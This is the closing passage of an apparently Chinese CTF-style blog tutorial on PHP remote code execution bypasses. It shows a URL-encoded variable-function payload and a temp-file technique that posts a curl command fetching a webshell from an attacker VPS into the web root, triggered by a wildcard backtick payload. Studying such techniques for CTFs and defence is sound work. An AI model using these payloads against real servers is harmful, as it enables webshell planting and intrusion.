b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
```

### 临时文件

临时文件目录

Linux临时文件目录：格式通常是`/tmp/php[6个随机字符]`

Windows临时文件目录：格式通常是`C:/Windows/php[4个随机字符].tmp`

大概就是在自己的vps上写一个命令执行的txt，然后在题目post该命令

```
curl http://your_vps/1.txt &gt; /var/www/html/1.php
```

然后 ?cmd=?&gt;&lt;?=`/??p/p?p??????`;

因为在linux里，如果一个文件里有命令，是可以通过这个文件名执行命令的，这里我们相当于使用临时文件执行了命令

这样就会把dd.txt里的内容以php的形式写入到网站服务器里。完成getshell。


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-rce/  

